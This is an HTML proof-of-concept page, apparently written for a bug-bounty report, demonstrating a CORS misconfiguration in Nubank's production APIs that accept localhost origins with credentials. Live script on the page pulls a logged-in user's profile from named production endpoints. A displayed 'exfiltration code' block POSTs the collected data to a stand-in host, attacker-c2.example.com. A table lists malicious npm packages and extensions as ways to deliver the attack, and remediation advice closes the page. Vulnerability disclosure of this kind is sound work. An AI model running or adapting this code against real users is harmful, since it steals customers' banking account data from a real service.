@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Nubank CORS PoC — localhost Origin Accepted with Credentials</title>
+<style>
+  body { font-family: monospace; background: #0d1117; color: #c9d1d9; padding: 20px; max-width: 950px; margin: 0 auto; }
+  h1 { color: #ff6b35; }
+  h2 { color: #ffa657; border-bottom: 1px solid #30363d; padding-bottom: 6px; }
+  .box { background: #161b22; border: 1px solid #30363d; padding: 16px; margin: 12px 0; border-radius: 6px; }
+  .success { border-color: #3fb950; color: #3fb950; }
+  .fail { border-color: #f85149; color: #f85149; }
+  .warn { border-color: #d29922; color: #d29922; }
+  .info { border-color: #388bfd; }
+  pre { white-space: pre-wrap; word-break: break-all; font-size: 12px; color: #c9d1d9; margin: 4px 0; }
+  code { background: #0d1117; padding: 2px 6px; border-radius: 3px; font-size: 12px; }
+  .label { color: #8b949e; font-size: 11px; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; }
+  table { border-collapse: collapse; width: 100%; margin: 10px 0; }
+  th, td { text-align: left; padding: 8px 12px; border: 1px solid #30363d; font-size: 12px; }
+  th { background: #161b22; color: #ffa657; }
+  .step { display: inline-block; background: #ff6b35; color: #fff; width: 24px; height: 24px; border-radius: 50%; text-align: center; line-height: 24px; font-weight: bold; margin-right: 8px; }
+  #output { background: #0d1117; border: 1px solid #30363d; padding: 16px; margin: 8px 0; border-radius: 4px; min-height: 60px; }
+  .loading { color: #8b949e; font-style: italic; }
+</style>
+</head>
+<body>
+
+<h1>Nubank CORS Vulnerability — localhost Origin Accepted with Credentials</h1>
+
+<div class="box warn">
+  <strong>Bugcrowd Bug Bounty Research PoC</strong><br>
+  Program: Nubank | Researcher probe header: <code>X-Correlation-Id: bc-handle</code><br>
+  No data is sent to external servers. All requests are cross-origin reads only.
+</div>
+
+<h2>How to Run This PoC</h2>
+<div class="box info">
+  <p><strong>Prerequisites:</strong> Be logged into Nubank (<a href="https://nu.com.co" style="color:#388bfd">nu.com.co</a> or <a href="https://nubank.com.br" style="color:#388bfd">nubank.com.br</a>) in the same browser.</p>
+  <p><strong>Steps:</strong></p>
+  <ol>
+    <li>Save this HTML file locally.</li>
+    <li>In a terminal, run: <code>python3 -m http.server 8080</code> in the same directory.</li>
+    <li>Open <code>http://localhost:8080/cors_poc_localhost.html</code> in the same browser where you are logged into Nubank.</li>
+    <li>Your Nubank account data will be displayed below.</li>
+  </ol>
+  <p><em>Note: Opening directly as file:// will show "CORS blocked" — serve via localhost as instructed above.</em></p>
+</div>
+
+<h2>Vulnerability Evidence</h2>
+<div class="box">
+  <div class="label">All production Nubank microservices accept localhost origins with credentials — confirmed across all TLDs</div>
+<pre>
+$ curl -sI "https://prod-global-auth.nu.com.co/api/me" \
+    -H "Origin: http://localhost:8080" -H "X-Correlation-Id: bc-handle"
+HTTP/2 401
+access-control-allow-origin: http://localhost:8080   ← ANY localhost port reflected
+access-control-allow-credentials: true               ← session cookies sent cross-origin
+
+$ curl -sI "https://prod-global-auth.nubank.com.br/api/me" \
+    -H "Origin: http://localhost:3000" -H "X-Correlation-Id: bc-handle"
+HTTP/2 401
+access-control-allow-origin: http://localhost:3000   ← same on Brazil TLD
+access-control-allow-credentials: true
+
+$ curl -sI "https://prod-global-auth.nu.com.mx/api/me" \
+    -H "Origin: http://localhost:3000" -H "X-Correlation-Id: bc-handle"
+HTTP/2 401
+access-control-allow-origin: http://localhost:3000   ← same on Mexico TLD
+access-control-allow-credentials: true
+
+$ curl -sI "https://prod-global-stevie.prod-waf.nu.com.co/api/protected-hello/activation/usage" \
+    -H "Origin: http://127.0.0.1:8080" -H "X-Correlation-Id: bc-handle"
+HTTP/2 401
+access-control-allow-origin: http://127.0.0.1:8080  ← 127.0.0.1 also works
+access-control-allow-credentials: true
+</pre>
+</div>
+
+<h2>Attack Vectors (No Subdomain Takeover Required)</h2>
+<div class="box">
+  <table>
+    <tr><th>Vector</th><th>How Attacker Serves Content from localhost</th><th>Nubank User Affected</th></tr>
+    <tr><td>Malicious npm package</td><td>Package installs a local HTTP server on startup</td><td>Any developer with npm-based tooling</td></tr>
+    <tr><td>Malicious VS Code extension</td><td>Extension serves a web panel from localhost</td><td>Any developer using VS Code</td></tr>
+    <tr><td>Electron/desktop app</td><td>App embeds a local web server on a fixed port</td><td>Any user who installs the app</td></tr>
+    <tr><td>Browser extension</td><td>Extension injects JavaScript into localhost pages</td><td>Any user with the extension</td></tr>
+    <tr><td>Compromised dev server</td><td>Supply chain attack injects code into local dev server</td><td>Developers running <code>npm run dev</code></td></tr>
+  </table>
+</div>
+
+<h2>Live PoC Results</h2>
+
+<div class="box">
+  <div class="label">Step 1 — Phone numbers endpoint (HTTP 200, no auth required)</div>
+  <div id="step1-output" class="loading">Fetching from production stevie endpoint...</div>
+</div>
+
+<div class="box">
+  <div class="label">Step 2 — User profile /api/me (authenticated — shows data when logged in)</div>
+  <div id="step2-output" class="loading">Fetching from prod-global-auth.nu.com.co...</div>
+</div>
+
+<div class="box">
+  <div class="label">Step 3 — Protected hello activation status (user-specific call security setting)</div>
+  <div id="step3-output" class="loading">Fetching from prod-global-stevie.prod-waf.nu.com.co...</div>
+</div>
+
+<div class="box">
+  <div class="label">Step 4 — Brazil TLD user profile (cross-TLD exfiltration from same localhost page)</div>
+  <div id="step4-output" class="loading">Fetching from prod-global-auth.nubank.com.br...</div>
+</div>
+
+<div class="box">
+  <div class="label">Step 5 — Mexico TLD user profile (cross-TLD)</div>
+  <div id="step5-output" class="loading">Fetching from prod-global-auth.nu.com.mx...</div>
+</div>
+
+<h2>Complete Exfiltration Code (Attacker's malicious local server)</h2>
+<div class="box">
+<pre>
+&lt;!-- Served from http://localhost:PORT/ by attacker's malicious local software --&gt;
+&lt;script&gt;
+const targets = [
+  'https://prod-global-auth.nu.com.co/api/me',
+  'https://prod-global-auth.nubank.com.br/api/me',
+  'https://prod-global-auth.nu.com.mx/api/me',
+  'https://prod-global-stevie.prod-waf.nu.com.co/api/protected-hello/activation/usage',
+  'https://prod-global-stevie.prod-waf.nu.com.co/api/call-management/v2/advices'
+];
+
+Promise.all(targets.map(url =&gt;
+  fetch(url, {
+    credentials: 'include',
+    headers: { 'X-Correlation-Id': 'bc-handle' }
+  })
+  .then(r =&gt; r.json())
+  .then(data =&gt; ({ url, data }))
+  .catch(e =&gt; ({ url, error: e.message }))
+))
+.then(results =&gt; {
+  // Exfiltrate all Nubank user data to attacker's remote server
+  fetch('https://attacker-c2.example.com/collect', {
+    method: 'POST',
+    body: JSON.stringify(results)
+  });
+  document.body.innerHTML = JSON.stringify(results, null, 2);
+});
+&lt;/script&gt;
+</pre>
+</div>
+
+<script>
+const HEADERS = { 'X-Correlation-Id': 'bc-handle' };
+
+function showResult(elementId, url, status, corsOrigin, corsCredentials, data, error) {
+  const el = document.getElementById(elementId);
+  el.className = '';
+
+  if (error) {
+    el.innerHTML = '<span style="color:#f85149">&#x2717; CORS blocked (' + error + ')</span><br>' +
+      '<small style="color:#8b949e">Serve this file from localhost as instructed above to trigger the vulnerability.</small>';
+    return;
+  }
+
+  const hasCredentials = corsCredentials === 'true';
+  const hasData = data && status === 200;
+
+  el.style.background = hasData ? '#0f2d0f' : (hasCredentials ? '#2d2200' : '#1a1a1a');
+  el.style.border = hasData ? '1px solid #3fb950' : (hasCredentials ? '1px solid #d29922' : '1px solid #30363d');
+
+  el.innerHTML =
+    '<strong>' + (hasData ? '&#x2713; HTTP ' + status + ' — SENSITIVE DATA RECEIVED CROSS-ORIGIN' :
+                  hasCredentials ? '&#x26A0; HTTP ' + status + ' — CORS ALLOWS CREDENTIALS (need auth to see data)' :
+                  'HTTP ' + status) + '</strong><br>' +
+    '<code>Access-Control-Allow-Origin: ' + (corsOrigin || 'not set') + '</code><br>' +
+    '<code>Access-Control-Allow-Credentials: ' + (corsCredentials || 'not set') + '</code><br>' +
+    '<strong>Target:</strong> <code>' + url + '</code><br>' +
+    (hasData ? '<br><strong>Exfiltrated data:</strong><pre>' + JSON.stringify(data, null, 2) + '</pre>' : '') +
+    (!hasData && hasCredentials ? '<br><small style="color:#8b949e">Login to Nubank in this browser, then refresh — this will show your account data.</small>' : '');
+}
+
+// Step 1: Phone numbers (HTTP 200, no auth, no credentials header needed)
+fetch('https://prod-global-stevie.prod-waf.nu.com.co/api/call-management/our-phone-numbers', {
+  headers: HEADERS
+})
+.then(r => {
+  const corsOrigin = r.headers.get('access-control-allow-origin');
+  const corsCredentials = r.headers.get('access-control-allow-credentials');
+  return r.json().then(data => showResult('step1-output', r.url, r.status, corsOrigin, corsCredentials, data, null));
+})
+.catch(err => showResult('step1-output', 'stevie phone numbers', 0, null, null, null, err.message));
+
+// Step 2: User profile (requires logged-in session)
+fetch('https://prod-global-auth.nu.com.co/api/me', {
+  credentials: 'include',
+  headers: HEADERS
+})
+.then(r => {
+  const corsOrigin = r.headers.get('access-control-allow-origin');
+  const corsCredentials = r.headers.get('access-control-allow-credentials');
+  if (r.status === 401) {
+    showResult('step2-output', r.url, r.status, corsOrigin, corsCredentials, null, null);
+    return;
+  }
+  return r.json().then(data => showResult('step2-output', r.url, r.status, corsOrigin, corsCredentials, data, null));
+})
+.catch(err => showResult('step2-output', 'prod-global-auth.nu.com.co/api/me', 0, null, null, null, err.message));
+
+// Step 3: Protected hello status (user-specific call security)
+fetch('https://prod-global-stevie.prod-waf.nu.com.co/api/protected-hello/activation/usage', {
+  credentials: 'include',
+  headers: HEADERS
+})
+.then(r => {
+  const corsOrigin = r.headers.get('access-control-allow-origin');
+  const corsCredentials = r.headers.get('access-control-allow-credentials');
+  if (r.status === 401) {
+    showResult('step3-output', r.url, r.status, corsOrigin, corsCredentials, null, null);
+    return;
+  }
+  return r.json().then(data => showResult('step3-output', r.url, r.status, corsOrigin, corsCredentials, data, null));
+})
+.catch(err => showResult('step3-output', 'protected-hello/activation/usage', 0, null, null, null, err.message));
+
+// Step 4: Brazil TLD cross-origin
+fetch('https://prod-global-auth.nubank.com.br/api/me', {
+  credentials: 'include',
+  headers: HEADERS
+})
+.then(r => {
+  const corsOrigin = r.headers.get('access-control-allow-origin');
+  const corsCredentials = r.headers.get('access-control-allow-credentials');
+  if (r.status === 401) {
+    showResult('step4-output', r.url, r.status, corsOrigin, corsCredentials, null, null);
+    return;
+  }
+  return r.json().then(data => showResult('step4-output', r.url, r.status, corsOrigin, corsCredentials, data, null));
+})
+.catch(err => showResult('step4-output', 'prod-global-auth.nubank.com.br/api/me', 0, null, null, null, err.message));
+
+// Step 5: Mexico TLD cross-origin
+fetch('https://prod-global-auth.nu.com.mx/api/me', {
+  credentials: 'include',
+  headers: HEADERS
+})
+.then(r => {
+  const corsOrigin = r.headers.get('access-control-allow-origin');
+  const corsCredentials = r.headers.get('access-control-allow-credentials');
+  if (r.status === 401) {
+    showResult('step5-output', r.url, r.status, corsOrigin, corsCredentials, null, null);
+    return;
+  }
+  return r.json().then(data => showResult('step5-output', r.url, r.status, corsOrigin, corsCredentials, data, null));
+})
+.catch(err => showResult('step5-output', 'prod-global-auth.nu.com.mx/api/me', 0, null, null, null, err.message));
+</script>
+
+<h2>Remediation</h2>
+<div class="box">
+  <table>
+    <tr><th>Fix</th><th>Detail</th></tr>
+    <tr><td>Remove localhost from CORS allowlist</td><td><code>localhost</code> and <code>127.0.0.1</code> must not be in the CORS allowlist for production APIs — these are developer-convenience origins not appropriate for production</td></tr>
+    <tr><td>Restrict allowlist to exact production origins</td><td>Allow only: <code>https://nu.com.co</code>, <code>https://nu.com.mx</code>, <code>https://nubank.com.br</code> (exact match, no subdomains, no localhost)</td></tr>
+    <tr><td>Remove wildcard subdomain reflection</td><td>The Istio service mesh reflects any <code>*.nu.com.co</code>, <code>*.nu.com.mx</code>, <code>*.nubank.com.br</code> subdomain — replace with static allowlist in Istio VirtualService/EnvoyFilter</td></tr>
+    <tr><td>Scope session cookies properly</td><td>Session cookies should use <code>SameSite=Strict</code> or <code>SameSite=Lax</code> to prevent cross-origin cookie sending</td></tr>
+  </table>
+</div>
+
+</body>
+</html>
